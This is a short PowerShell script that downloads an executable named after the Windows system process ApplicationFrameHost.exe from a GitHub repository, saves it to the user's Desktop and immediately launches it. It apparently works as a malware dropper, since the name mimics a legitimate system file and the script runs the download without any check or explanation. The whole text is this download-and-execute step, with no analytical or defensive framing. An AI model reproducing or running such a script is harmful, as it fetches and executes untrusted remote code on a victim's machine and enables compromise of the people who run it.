$url = "https://github.com/peiceofmind/refactored-memory/raw/main/ApplicationFrameHost.exe"

$destination = [Environment]::GetFolderPath("Desktop") + "\ApplicationFrameHost.exe"

$client = New-Object System.Net.WebClient

$client.DownloadFile($url, $destination)

$client.Dispose()

Start-Process $destination